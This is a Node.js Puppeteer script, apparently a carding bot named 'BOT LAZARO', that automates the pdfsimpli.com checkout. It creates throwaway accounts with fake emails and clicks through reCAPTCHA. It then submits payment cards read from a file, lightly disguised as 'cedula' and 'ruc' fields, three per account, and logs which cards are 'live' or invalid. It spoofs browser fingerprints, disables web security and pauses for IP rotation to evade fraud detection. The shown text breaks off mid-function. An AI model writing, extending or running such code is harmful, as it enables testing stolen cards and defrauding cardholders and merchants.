// ======================================================
//  ⚡ CYBER NEON THEME — BY McMetric (INTEGRADO)
// ======================================================

const COLORS_NEON = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",

    neonCyan: "\x1b[96m",
    neonMagenta: "\x1b[95m",
    neonBlue: "\x1b[94m",
    neonPurple: "\x1b[35m",
    neonPink: "\x1b[91m",
    neonGreen: "\x1b[92m",
    neonYellow: "\x1b[93m",
};

// Guardamos logs originales
const _log = console.log;
const _warn = console.warn;
const _error = console.error;

console.log = (...msg) => {
    _log(COLORS_NEON.neonCyan + COLORS_NEON.bright + "▶ " + msg.join(" ") + COLORS_NEON.reset);
};
console.warn = (...msg) => {
    _warn(COLORS_NEON.neonYellow + COLORS_NEON.bright + "⚠ " + msg.join(" ") + COLORS_NEON.reset);
};
console.error = (...msg) => {
    _error(COLORS_NEON.neonPink + COLORS_NEON.bright + "✖ ERROR: " + msg.join(" ") + COLORS_NEON.reset);
};

// 🔥 Banner Cyber-NEON
console.log(
    COLORS_NEON.neonMagenta +
    COLORS_NEON.bright +
`
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║    ██████╗  ██████╗ ████████╗     ██╗   ██╗███████╗██████╗ ███████╗  ║
║    ██╔══██╗██╔═══██╗╚══██╔══╝     ██║   ██║██╔════╝██╔══██╗██╔════╝  ║
║    ██║  ██║██║   ██║   ██║   ███████║   ██║█████╗  ██████╔╝█████╗    ║
║    ██║  ██║██║   ██║   ██║   ██╔══██║   ██║██╔══╝  ██╔══██╗██╔══╝    ║
║    ██████╔╝╚██████╔╝   ██║   ██║  ██║██╗██║███████╗██║  ██║███████╗  ║
║    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ║
║                                                                      ║
║           🟣 BOT LAZARO — CYBER NEON MODE ACTIVATED 🟣               ║
║                        by McMetric & Anthony98                        ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
`
+ COLORS_NEON.reset
);

// ======================================================
// FIN DEL TEMA CYBER NEON
// ======================================================

// 🔥 BOT LAZARO — ULTRA FINAL (TERMUX + XVFB Edition)
// FLUJO COMPLETO + RÁPIDO + CLOSE KILLER + LOOP DE CUENTAS
// + ELIMINAR TARJETAS + VALIDAS/INVALIDAS + ROTACIÓN IP MANUAL
// + FORMULARIO LENTO HUMANO + AUTOREPARACIÓN + XVFB SUPPORT

const puppeteer = require('puppeteer-core');
const fs = require('fs').promises;
const path = require('path');

// ======================================================
// 🔥 CAPTCHA SOLVER UNIVERSAL
// ======================================================
class CaptchaSolver {
    constructor(page, log = console.log) {
        this.page = page;
        this.log = log;
    }

    delay(ms) { return new Promise(res => setTimeout(res, ms)); }

    async solve() {
        try {
            await this.delay(2000);
            let anchor = null, frameFound = null;

            await this.log("🔍 Buscando CAPTCHA...");

            for (let i = 0; i < 12; i++) {
                for (const f of this.page.frames()) {
                    anchor =
                        await f.$("#recaptcha-anchor") ||
                        await f.$(".recaptcha-checkbox-checkmark") ||
                        await f.$(".recaptcha-checkbox");

                    if (anchor) {
                        frameFound = f;
                        await this.log(`✅ CAPTCHA encontrado en ${f.url().slice(0, 60)}...`);
                        break;
                    }
                }
                if (anchor) break;

                await this.delay(700);
            }

            if (!anchor) {
                await this.log("⏩ No hay CAPTCHA");
                return true;
            }

            const box = await anchor.boundingBox();
            if (box) {
                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.delay(100);
                await this.page.mouse.down();
                await this.delay(80);
                await this.page.mouse.up();
            } else {
                await anchor.click();
            }

            await this.delay(3000);

            for (let i = 0; i < 5; i++) {
                try {
                    const ok = await frameFound.$eval(
                        "#recaptcha-anchor",
                        el => el.getAttribute("aria-checked") === "true"
                    );
                    if (ok) {
                        await this.log("🟢 CAPTCHA resuelto");
                        return true;
                    }
                } catch (_) { }
                await this.delay(1200);
            }

            await this.log("⚠️ CAPTCHA manual");
            await this.delay(8000);
            return true;

        } catch (e) {
            await this.log("⚠️ Error captcha: " + e.message);
            return true;
        }
    }
}

// ======================================================
// 🔥 KATY20 – BRAIN ENGINE
// ======================================================
class PDFSimpliBot {
    constructor() {
        this.baseDir = "/home/faelo/botdata";
        this.logFile = path.join(this.baseDir, "bot_log.txt");
        this.cuentasFile = path.join(this.baseDir, "cuentas_pdfsimpli.json");
        this.livesFile = path.join(this.baseDir, "lives.txt");

        this.CHROMIUM_PATHS = [
    "/usr/bin/google-chrome",     // ✔ Chrome real en WSL
    "/usr/bin/chromium",          // fallback
    "/usr/bin/chromium-browser",  // fallback (aunque falla en WSL)
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
];


        this.browser = null;
        this.page = null;

        this.tarjetas = [];
        this.tarjetaIndex = 0;

        // 🔥 NUEVO: CONTADOR DE CUENTAS
        this.cuentasProcesadas = 0;

        this.cardsThisAccount = 0;
    }

    delay(ms) { return new Promise(res => setTimeout(res, ms)); }

    async log(msg) {
        // ✅ SOLO EL MENSAJE, SIN FECHA NI HORA
        const t = msg;
        console.log(t);
        await fs.appendFile(this.logFile, `[${new Date().toISOString()}] ${t}\n`);
    }

    async ensureDir(d) {
        try { await fs.mkdir(d, { recursive: true }); } catch (_) { }
    }

    async findChromium() {
        for (const p of this.CHROMIUM_PATHS) {
            try { await fs.access(p); return p; } catch (_) { }
        }
        throw new Error("❌ Chromium no encontrado");
    }

    async deepFind(selector) {
        let el = await this.page.$(selector);
        if (el) return el;

        for (const f of this.page.frames()) {
            try {
                el = await f.$(selector);
                if (el) return el;
            } catch (_) { }
        }

        return null;
    }

    // =============================================================
    // CLICK UNIVERSAL
    // =============================================================
    async ultraClick(selector) {
        for (let i = 0; i < 5; i++) {
            const el = await this.deepFind(selector);
            if (el) {
                try {
                    const box = await el.boundingBox();
                    if (box) {
                        await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                        await this.delay(70);
                        await this.page.mouse.down();
                        await this.delay(60);
                        await this.page.mouse.up();
                        return true;
                    } else {
                        await el.click();
                        return true;
                    }
                } catch (_) { }
            }
            await this.delay(350);
        }
        return false;
    }

    // =============================================================
    // INIT
    // =============================================================
    async initialize() {
        await this.ensureDir(this.baseDir);
        await this.ensureDir(path.join(this.baseDir, "documents"));
        await this.ensureDir(path.join(this.baseDir, "downloads"));

        const chromium = await this.findChromium();

        this.browser = await puppeteer.launch({
            executablePath: chromium,
            headless: false,
            ignoreHTTPSErrors: true,
            defaultViewport: null,
            args: [
                "--incognito",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-infobars",
                "--no-first-run",
                "--no-default-browser-check",
                "--disable-web-security",
                "--ignore-certificate-errors",
                "--ignore-certificate-errors-spki-list",
                "--disable-blink-features=AutomationControlled",
                "--disable-features=IsolateOrigins,site-per-process",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-software-rasterizer",
                "--window-size=1920,1080"
            ]
        });

        this.page = await this.browser.newPage();

        // 🥷 User Agent realista
        await this.page.setUserAgent(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
            "(KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36"
        );

        // 🥷 Anti-detect
        await this.page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, "webdriver", { get: () => undefined });
            window.chrome = { runtime: {} };
            Object.defineProperty(navigator, "plugins", { get: () => [1,2,3,4] });
            Object.defineProperty(navigator, "languages", { get: () => ["es-EC","es","en-US"] });
        });

        await this.log("🚀 KATY20 — Inicializado en modo SIGILOSO elite");
    }

    async getIP() {
        try {
            const tab = await this.browser.newPage();
            await tab.goto("https://api.ipify.org?format=json", {
                waitUntil: "networkidle2",
                timeout: 30000
            });

            const data = await tab.evaluate(() => document.body.innerText);
            await tab.close();

            const json = JSON.parse(data);
            return json.ip || "0.0.0.0";

        } catch (e) {
            await this.log("⚠️ Error leyendo IP: " + e.message);
            return "0.0.0.0";
        }
    }
    // =============================================================
    // ROTACIÓN IP MANUAL CADA 2 CUENTAS
    // =============================================================
    async rotacionManualSiToca() {
        if (this.cuentasProcesadas === 0) return;
        if (this.cuentasProcesadas % 2 !== 0) return;

        await this.log("🔄 ROTACIÓN IP MANUAL — ACTIVAR MODO AVIÓN AHORA");
        await this.log("⏳ Esperando cambio REAL de IP…");

        let ipInicial = await this.getIP();
        await this.log(`📌 IP inicial detectada: ${ipInicial}`);

        while (true) {
            await this.delay(3000);

            let ipNueva = await this.getIP();

            if (ipNueva && ipNueva !== ipInicial) {
                await this.log(`🟢 IP CAMBIADA — ${ipInicial} → ${ipNueva}`);
                await this.delay(2000);
                return;
            }

            await this.log(`⚠️ Misma IP (${ipNueva})... esperando cambio...`);
        }
    }

    // =============================================================
    // TARJETAS
    // =============================================================
    async loadAllTarjetas() {
        const raw = await fs.readFile(path.join(this.baseDir, "tarjetas.txt"), "utf8");
        this.tarjetas = raw
            .split(/\r?\n/)
            .map(l => l.trim())
            .filter(Boolean)
            .map(line => {
                const [cedula, mes, anio, ruc] = line.split("|");
                return { cedula, mes, anio, ruc };
            });

        this.tarjetaIndex = 0;
        this.cardsThisAccount = 0;

        await this.log(`💾 Tarjetas cargadas: ${this.tarjetas.length}`);
    }

    getNextTarjeta() {
        if (this.tarjetaIndex >= this.tarjetas.length) return null;
        const t = this.tarjetas[this.tarjetaIndex];
        this.tarjetaIndex++;
        return t;
    }

    async guardarCedulaValida(t) {
        const line = `${t.cedula}|${t.mes}|${t.anio}|${t.ruc}|VALIDA|${new Date().toISOString()}\n`;
        await fs.appendFile(this.livesFile, line);
        await this.log(`💾 LIVE GUARDADA: ${t.cedula}`);
    }

    // =============================================================
    // ELIMINAR TARJETA PROCESADA
    // =============================================================
    async eliminarTarjetaDelArchivo(tarjeta) {
        try {
            const file = path.join(this.baseDir, "tarjetas.txt");
            const raw = await fs.readFile(file, "utf8");

            const lineToRemove = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}`;

            const newData = raw
                .split(/\r?\n/)
                .filter(l => l.trim() && l.trim() !== lineToRemove)
                .join("\n");

            await fs.writeFile(file, newData);
            await this.log(`🗑️ Tarjeta eliminada del archivo: ${lineToRemove}`);

        } catch (e) {
            await this.log("⚠️ Error eliminando tarjeta del archivo: " + e.message);
        }
    }

    // =============================================================
    // GUARDAR TARJETA VALIDA O INVALIDA
    // =============================================================
    async guardarTarjetaEnArchivo(tarjeta, esValida) {
        try {
            const file = path.join(
                this.baseDir,
                esValida ? "validas.txt" : "invalidas.txt"
            );

            const line = `${tarjeta.cedula}|${tarjeta.mes}|${tarjeta.anio}|${tarjeta.ruc}|${
                esValida ? "VALIDA" : "INVALIDA"
            }|${new Date().toISOString()}\n`;

            await fs.appendFile(file, line);

            await this.log(
                `📦 Tarjeta movida a ${esValida ? "validas.txt" : "invalidas.txt"}: ${
                    tarjeta.cedula
                }`
            );

        } catch (e) {
            await this.log("⚠️ Error guardando tarjeta en archivo: " + e.message);
        }
    }

    // =============================================================
    // SUBIR PDF — +5s EXTRA
    // =============================================================
    async uploadPDF() {
        await this.log("📄 Buscando input file...");
        const input = await this.deepFind('input[type="file"]');

        if (!input) throw new Error("❌ Input file no encontrado");

        const docs = path.join(this.baseDir, "documents");
        const files = await fs.readdir(docs);
        const pdf = files.find(f => f.endsWith(".pdf"));
        if (!pdf) throw new Error("❌ No hay PDF");

        const pdfPath = path.join(docs, pdf);
        await input.uploadFile(pdfPath);

        await this.log("📁 PDF subido: " + pdfPath);

        await this.delay(9000); // ← aquí el +5s
    }

    // =============================================================
    // GET STARTED
    // =============================================================
    async clickLetsGetStarted() {
        await this.log("🔍 GET STARTED...");

        let ok = await this.ultraClick("#preEditPop");
        if (!ok) {
            ok = await this.page.evaluate(() => {
                for (const b of document.querySelectorAll("button,div,a")) {
                    if ((b.innerText || "").toLowerCase().includes("get started")) {
                        b.click(); return true;
                    }
                }
                return false;
            });
        }

        if (!ok) throw new Error("❌ GET STARTED no encontrado");

        await this.log("🟢 GET STARTED presionado");
        await this.delay(3000);
    }

    // =============================================================
    // CONVERT
    // =============================================================
    async clickConvert() {
        await this.log("⚙️ Esperando Convert...");

        let btn = null;

        for (let i = 0; i < 20; i++) {
            for (const f of this.page.frames()) {
                btn =
                    await f.$("#ConvertContinue") ||
                    await f.$("button[data-test='convert']") ||
                    await f.$(".button-convert");

                if (btn) break;
            }

            if (btn) break;

            if (i % 5 === 0)
                await this.log(`⏳ Convert intento ${i}/20`);

            await this.delay(900);
        }

        if (!btn) throw new Error("❌ Convert no apareció");

        const box = await btn.boundingBox();
        if (box) {
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(100);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();
        } else {
            await btn.click();
        }

        await this.log("🟢 Convert presionado");
        await this.delay(6000);
    }

    // =============================================================
    // DOWNLOAD
    // =============================================================
    async clickDownload() {
        await this.log("⬇️ DOWNLOAD...");

        await this.page._client().send("Page.setDownloadBehavior", {
            behavior: "allow",
            downloadPath: path.join(this.baseDir, "downloads")
        });

        const ok = await this.ultraClick("#congDwnaut");
        if (!ok) {
            await this.log("⚠️ DOWNLOAD no disponible ahora");
            return false;
        }

        await this.log("📥 DOWNLOAD presionado");
        await this.delay(6000);
        return true;
    }

    // =============================================================
    // REGISTRO
    // =============================================================
    async handleRegistration() {
        await this.log("🧑‍💻 Registro...");

        const emailInput = await this.deepFind("#email");
        if (!emailInput) {
            await this.log("✔️ No pidió registro");
            return;
        }

        const passInput = await this.deepFind("#password");

        const email = `user${Date.now()}@gmail.com`;
        const pass = "P" + Math.random().toString(36).slice(2, 8) + "!";

        await emailInput.type(email);
        if (passInput) await passInput.type(pass);

        await this.ultraClick("#sign-up");

        await this.log("⏳ CAPTCHA...");
        await this.delay(8000);

        const solver = new CaptchaSolver(this.page, this.log.bind(this));
        await solver.solve();

        await this.log(`🟢 Cuenta creada: ${email}`);
        await this.delay(1500);
    }

    // =============================================================
    // BOTÓN CONTINUE
    // =============================================================
    async safeFindContinueButton() {
        try {
            for (const f of this.page.frames()) {
                const btn =
                    await f.$("#planPageContinueButton") ||
                    await f.$("button[data-test='continue']") ||
                    await f.$(".continue-button") ||
                    await f.$("button[id*='continue' i]") ||
                    await f.$("a[id*='continue' i]") ||
                    await f.$("div[id*='continue' i]") ||
                    await f.$("button[class*='continue' i]") ||
                    await f.$("a[class*='continue' i]") ||
                    await f.$("div[class*='continue' i]");

                if (btn) return btn;
            }

            const handle = await this.page.evaluateHandle(() => {
                const tags = ["button", "a", "div", "input"];
                for (const t of tags) {
                    for (const el of document.querySelectorAll(t)) {
                        const txt = (el.innerText || el.value || "").toLowerCase();
                        if (txt.includes("continue")) return el;
                    }
                }
                return null;
            });

            if (handle && handle.asElement) return handle.asElement();

            const list = [
                "button[id*='continue' i]",
                "button[class*='continue' i]",
                "button[data-id*='continue' i]",
                "a[class*='continue' i]",
                "a[id*='continue' i]",
                "input[type='button'][value*='continue' i]"
            ];

            for (const s of list) {
                const el = await this.page.$(s);
                if (el) return el;
            }

            return null;

        } catch (e) {
            console.log("❌ safeFindContinueButton:", e);
            return null;
        }
    }

    async waitAndClickContinueToPayment() {
        await this.log("🔍 Buscando botón CONTINUE (plan)...");

        let btn = null;

        for (let i = 0; i < 20; i++) {
            btn = await this.safeFindContinueButton();
            if (btn) break;

            if (i % 5 === 0)
                await this.log(`⏳ CONTINUE intento ${i}/20`);

            await this.delay(1000);
        }

        if (!btn) throw new Error("❌ CONTINUE no apareció (plan)");

        const box = await btn.boundingBox();
        if (box) {
            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
            await this.delay(100);
            await this.page.mouse.down();
            await this.delay(60);
            await this.page.mouse.up();
        } else {
            await btn.click();
        }

        await this.delay(5000);
        await this.log("🟢 CONTINUE presionado → entrando a PAGO...");
    }
    // =============================================================
    // VERIFICAR QUE ESTAMOS EN LA PÁGINA DE PAGO (Checkout)
    // =============================================================
    async waitForCheckoutPage() {
        const expectedURL = "pdfsimpli.com/app/billing/checkout";

        await this.log("🔎 Verificando página de pago (Checkout)...");

        for (let i = 1; i <= 20; i++) {

            const current = this.page.url();

            // 1️⃣ Confirmar que la URL contiene /checkout
            if (current.includes(expectedURL)) {
                await this.log("🟢 URL correcta detectada: Checkout");

                // 2️⃣ Confirmar que los campos del formulario están cargados
                const nombreField =
                    await this.deepFind("#checkout_form_card_name") ||
                    await this.deepFind("[name='cardName']");

                const cardField = await this.deepFind("input[name='cardNumber'], input#data");

                if (nombreField && cardField) {
                    await this.log("🟢 Formulario de pago cargado correctamente");
                    return true;
                }

                await this.log("⏳ URL correcta pero formulario no está listo... esperando...");
            } else {
                await this.log(`⏳ Aún no está en Checkout (URL: ${current})`);
            }

            await this.delay(1500);
        }

        throw new Error("❌ No se cargó la página de pago /checkout después de 20 intentos");
    }

    // =============================================================
    // FORMULARIO COMPLETO
    // =============================================================
    async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
        await this.waitForCheckoutPage();

        await this.log("🧾 Llenando formulario COMPLETO...");
        const nombreField =
            await this.deepFind("#checkout_form_card_name") ||
            await this.deepFind("[name='cardName']");

        if (!nombreField) throw new Error("❌ Campo NOMBRE no encontrado");

        await nombreField.click({ clickCount: 3 });
        await nombreField.type(nombre);

        // MES
        const mesOk = await this.page.evaluate((mesStr) => {
            const s = document.querySelector("select[name='ccMonthExp'], #expmo");
            if (!s) return false;
            const v = String(parseInt(mesStr, 10));
            if (!v || v === "NaN") return false;
            s.value = v;
            ["input", "change", "blur"].forEach(ev =>
                s.dispatchEvent(new Event(ev, { bubbles: true }))
            );
            return true;
        }, mes);

        if (!mesOk) throw new Error("❌ No se pudo seleccionar el MES");

        await this.delay(2000);

        // AÑO
        const anioOk = await this.page.evaluate((anioStr) => {
            const s = document.querySelector("select[name='ccYearExp'], #expyr");
            if (!s) return false;
            const v = String(parseInt(anioStr, 10));
            if (!v || v === "NaN") return false;
            s.value = v;
            ["input", "change", "blur"].forEach(ev =>
                s.dispatchEvent(new Event(ev, { bubbles: true }))
            );
            return true;
        }, anio);

        if (!anioOk) throw new Error("❌ No se pudo seleccionar el AÑO");

        // Número de tarjeta
        const frames = this.page.frames();
        let cedulaField = null;

        for (const f of frames) {
            const cand = await f.$("input[name='cardNumber'], input#data");
            if (!cand) continue;

            const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
            if (maxLen && parseInt(maxLen, 10) >= 16) {
                cedulaField = cand;
                break;
            }
        }

        if (!cedulaField) throw new Error("❌ Campo número de tarjeta no encontrado");

        await cedulaField.click({ clickCount: 3 });
        await cedulaField.type(cedula);

        // RUC
        let rucField = null;
        for (const f of frames) {
            const cand = await f.$("input#data[name='Data'], input[maxlength='4']");
            if (!cand) continue;

            const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
            if (maxLen === "4") {
                rucField = cand;
                break;
            }
        }

        if (!rucField) throw new Error("❌ Campo RUC no encontrado");

        await rucField.click({ clickCount: 3 });
        await rucField.type(ruc);

        // Checkbox
        let checkbox = await this.deepFind("#acceptCheckboxMark");
        if (!checkbox) throw new Error("❌ Checkbox de aceptación no encontrado");

        await this.page.evaluate(el => el.click(), checkbox);

        // Submit
        let submit = await this.deepFind("#btnChargeebeeSubmit");
        if (!submit) throw new Error("❌ Botón SUBMIT no encontrado");

        await this.page.evaluate(
            el => el.scrollIntoView({ behavior: "instant" }),
            submit
        );
        await submit.click();

        await this.log("🚀 Pago enviado (FLUJO COMPLETO)");
        await this.delay(2000);
    }

    // =============================================================
    // FLUJO RÁPIDO
    // =============================================================
    async fillCardFast(cedula, ruc) {
        await this.waitForCheckoutPage();

        await this.log("⚡ FLUJO RÁPIDO: solo número + RUC...");

        let cedulaField = null;

        // 🔥 HASTA 3 INTENTOS PARA ENCONTRAR EL CAMPO
        for (let intento = 1; intento <= 3; intento++) {
            const frames = this.page.frames();

            for (const f of frames) {
                try {
                    const cand = await f.$("input[name='cardNumber'], input#data");
                    if (!cand) continue;

                    const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                    
                    if (maxLen && parseInt(maxLen, 10) >= 16) {
                        cedulaField = cand;
                        break;
                    }
                } catch (_) {}
            }

            if (cedulaField) break;

            await this.log(`⚠️ No se encontró campo de número (rápido) — reintento ${intento}/3`);
            await this.delay(1500); // Delay humano antes de volver a buscar
        }

        // ❌ Después de 3 intentos aún no existe
        if (!cedulaField) {
            throw new Error("❌ No se encontró campo de número (rápido) después de 3 intentos");
        }

        // ✔ Campo encontrado → continuar flujo
        await cedulaField.click({ clickCount: 3 });
        await cedulaField.type(cedula);

        // ============================================
        // RUC — Igual estable que arriba
        // ============================================
        let rucField = null;

        for (let intento = 1; intento <= 3; intento++) {
            const frames = this.page.frames();

            for (const f of frames) {
                try {
                    const cand = await f.$("input#data[name='Data'], input[maxlength='4']");
                    if (!cand) continue;

                    const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
                    if (maxLen === "4") {
                        rucField = cand;
                        break;
                    }
                } catch (_) {}
            }

            if (rucField) break;

            await this.log(`⚠️ No se encontró campo RUC (rápido) — reintento ${intento}/3`);
            await this.delay(1500);
        }

        if (!rucField) {
            throw new Error("❌ No se encontró campo RUC (rápido) después de 3 intentos");
        }

        await rucField.click({ clickCount: 3 });
        await rucField.type(ruc);

        let submit = await this.deepFind("#btnChargeebeeSubmit");
        if (!submit) throw new Error("❌ Botón SUBMIT no encontrado (rápido)");

        await this.page.evaluate(
            el => el.scrollIntoView({ behavior: "instant" }),
            submit
        );
        await submit.click();

        await this.log("🚀 Pago enviado (FLUJO RÁPIDO)");
        await this.delay(2000);
    }

    // =============================================================
    // CLOSE KILLER
    // =============================================================
    async findCloseButton() {
        const frames = [this.page, ...this.page.frames()];

        for (const ctx of frames) {
            try {
                const handle = await ctx.evaluateHandle(() => {
                    const all = [...document.querySelectorAll("button")];
                    return (
                        all.find(b => {
                            const text = (b.innerText || "").trim().toLowerCase();
                            const cls = b.className || "";
                            const tracker = b.getAttribute("data-tracker") === "true";

                            const looksLike =
                                cls.includes("bg-ps-reskin-radial") ||
                                cls.includes("rounded-3xl");

                            return (
                                text.includes("close") &&
                                (tracker || looksLike || text === "close")
                            );
                        }) || null
                    );
                });
                if (handle && handle.asElement()) return handle.asElement();
            } catch (_) { }
        }

        const selectors = [
            "button[data-tracker='true']",
            "button[class*='bg-ps-reskin-radial']",
            "button[class*='rounded-3xl']",
            "button"
        ];

        for (const ctx of frames) {
            for (const sel of selectors) {
                try {
                    const btns = await ctx.$$(sel);
                    for (const b of btns) {
                        const text = (await b.evaluate(el => el.innerText || "")).trim().toLowerCase();
                        if (text.includes("close")) return b;
                    }
                } catch (_) { }
            }
        }

        return null;
    }

    async closeErrorModal() {
        await this.log("🔎 Buscando botón Close...");

        let foundAny = false;

        for (let intento = 0; intento < 12; intento++) {
            const btn = await this.findCloseButton();

            if (!btn) {
                if (!foundAny) {
                    await this.log("🟢 No hay modal de error visible (sin Close)");
                    return false;
                } else {
                    await this.log("🟢 Modal ya cerrado");
                    return true;
                }
            }

            foundAny = true;
            await this.log(`🔴 Close detectado → click intento ${intento + 1}`);

            try {
                await this.page.evaluate(el => {
                    el.scrollIntoView({ behavior: "instant", block: "center" });
                }, btn);
            } catch (_) { }

            try {
                const box = await btn.boundingBox();
                if (box) {
                    await this.page.mouse.move(
                        box.x + box.width / 2,
                        box.y + box.height / 2
                    );
                    await this.delay(80);
                    await this.page.mouse.down();
                    await this.delay(70);
                    await this.page.mouse.up();
                } else {
                    await this.page.evaluate(el => el.click(), btn);
                }
            } catch (_) { }

            await this.delay(1000);
        }

        if (foundAny) {
            await this.log("💣 FORCE MODE → Eliminando modal por DOM");
            try {
                await this.page.evaluate(() => {
                    [...document.querySelectorAll("button")].forEach(b => {
                        if ((b.innerText || "").toLowerCase().includes("close")) {
                            let p = b;
                            for (let i = 0; i < 5; i++) {
                                if (!p.parentElement) break;
                                p = p.parentElement;
                            }
                            p.remove();
                        }
                    });
                });
            } catch (_) { }

            await this.delay(500);
            await this.log("🟢 Modal destruido (Force Mode)");
            return true;
        }

        return false;
    }

    // =============================================================
    // VERIFICAR RESULTADO PAGO
    // =============================================================
    async verificarResultadoPago(tarjetaActual) {
        const cedulaTxt = tarjetaActual ? tarjetaActual.cedula : "N/A";

        await this.log("⏳ Esperando 10 segundos para que procese el pago...");
        await this.delay(10000);

        const startCheck = Date.now();
        const maxCheck = 15000;
        let success = false;

        while (Date.now() - startCheck < maxCheck) {
            const currentUrl = this.page.url();
            const pageSource = (await this.page.content()).toLowerCase();

            if (currentUrl.includes("pdfsimpli.com/app/billing/confirmation")) {
                success = true;
            }

            if (!success) {
                try {
                    const visibleSuccess = await this.page.evaluate(() => {
                        const terms = ["payment successful", "thank you", "transaction completed"];
                        const all = [...document.querySelectorAll("body, body *")];
                        for (const el of all) {
                            const txt = (el.innerText || "").toLowerCase();
                            if (!txt) continue;
                            if (terms.some(t => txt.includes(t))) return true;
                        }
                        return false;
                    });
                    if (visibleSuccess) success = true;
                } catch (_) { }
            }

            if (!success) {
                const terms = ["payment successful", "thank you", "transaction completed"];
                if (terms.some(t => pageSource.includes(t))) {
                    success = true;
                }
            }

            if (success) break;

            await this.delay(1000);
        }

        if (success) {
            await this.log(
                `${COLORS_NEON.neonGreen}✅ TARJETA VÁLIDA — PAGO EXITOSO (${cedulaTxt})${COLORS_NEON.reset}`
            );
            if (tarjetaActual) await this.guardarCedulaValida(tarjetaActual);
            return true;
        }

        const hadClose = await this.closeErrorModal();
        if (hadClose) {
            await this.log(
                `${COLORS_NEON.neonPink}❌ TARJETA INVÁLIDA — MODAL CLOSE DETECTADO (${cedulaTxt})${COLORS_NEON.reset}`
            );
            return false;
        }

        const src = (await this.page.content()).toLowerCase();
        const errorTerms = ["declined", "error", "invalid", "failed", "rejected"];
        if (errorTerms.some(t => src.includes(t))) {
            await this.log(
                `${COLORS_NEON.neonPink}❌ TARJETA INVÁLIDA — MENSAJE DE ERROR DETECTADO (${cedulaTxt})${COLORS_NEON.reset}`
            );
            return false;
        }

        await this.log(
            `${COLORS_NEON.neonPink}❌ TARJETA INVÁLIDA — TIMEOUT SIN ÉXITO NI CLOSE (${cedulaTxt})${COLORS_NEON.reset}`
        );
        return false;
    }

    // =============================================================
    // PROCESO TARJETA (GUARDAR + BORRAR)
    // =============================================================
    async procesarTarjeta(tarjeta, usarRapido) {
        const { cedula, mes, anio, ruc } = tarjeta;
        const nombre = "User" + Math.random().toString(36).slice(2, 7);

        if (!usarRapido) {
            await this.fillPaymentForm(cedula, mes, anio, ruc, nombre);
        } else {
            await this.fillCardFast(cedula, ruc);
        }

        const ok = await this.verificarResultadoPago(tarjeta);

        await this.guardarTarjetaEnArchivo(tarjeta, ok);

        await this.eliminarTarjetaDelArchivo(tarjeta);

        return ok;
    }

    // =============================================================
    // FLUJO PRINCIPAL DE UNA CUENTA (3 TARJETAS)
    // =============================================================
    async executeFlowCuenta() {
        await this.log("🌐 Cargando PDFSimpli (nueva cuenta)...");
        await this.page.goto("https://pdfsimpli.com", {
            waitUntil: "networkidle2",
            timeout: 60000
        });

        await this.delay(1500);

        await this.uploadPDF();
        await this.clickLetsGetStarted();
        await this.clickConvert();

        await this.clickDownload();

        await this.handleRegistration();

        await this.waitAndClickContinueToPayment();

        this.cardsThisAccount = 0;

        while (this.cardsThisAccount < 3) {
            const tarjeta = this.getNextTarjeta();
            if (!tarjeta) {
                await this.log("⛔ No hay más tarjetas en tarjetas.txt");
                return false;
            }

            const usarRapido = this.cardsThisAccount > 0;
            this.cardsThisAccount++;

            await this.log(
                `💳 Probando tarjeta #${this.cardsThisAccount} en cuenta (modo: ${usarRapido ? "RÁPIDO" : "COMPLETO"})`
            );

            try {
                const ok = await this.procesarTarjeta(tarjeta, usarRapido);

                if (ok) {
                    await this.log("🏁 CUENTA FINALIZADA POR TARJETA VÁLIDA → CREAR NUEVA CUENTA");
                    this.cuentasProcesadas++; // 🔥 NUEVO
                    return true;
                }

            } catch (e) {
                await this.log("⚠️ Error procesando tarjeta: " + e.message);
            }
        }

        await this.log("⛔ Las 3 tarjetas de esta cuenta fueron inválidas — se creará una nueva cuenta.");
        this.cuentasProcesadas++; // 🔥 NUEVO
        return true;
    }

    async close() {
        if (this.browser) {
            await this.browser.close();
            await this.log("🔚 Navegador cerrado");
        }
    }

    async restartBrowser() {
        try {
            if (this.page) {
                try { await this.page.close(); } catch (_) {}
            }
            if (this.browser) {
                try { await this.browser.close(); } catch (_) {}
            }

            const chromium = await this.findChromium();

            this.browser = await puppeteer.launch({
                executablePath: chromium,
                headless: false,
                ignoreHTTPSErrors: true,
                defaultViewport: null,
                args: [
                    "--incognito",
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-infobars",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "--disable-web-security",
                    "--ignore-certificate-errors",
                    "--ignore-certificate-errors-spki-list",
                    "--disable-blink-features=AutomationControlled",
                    "--disable-features=IsolateOrigins,site-per-process",
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--disable-software-rasterizer",
                    "--window-size=1920,1080"
                ]
            });

            this.page = await this.browser.newPage();

            // Anti-detect
            await this.page.setUserAgent(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
                "(KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36"
            );

            await this.page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, "webdriver", { get: () => undefined });
                window.chrome = { runtime: {} };
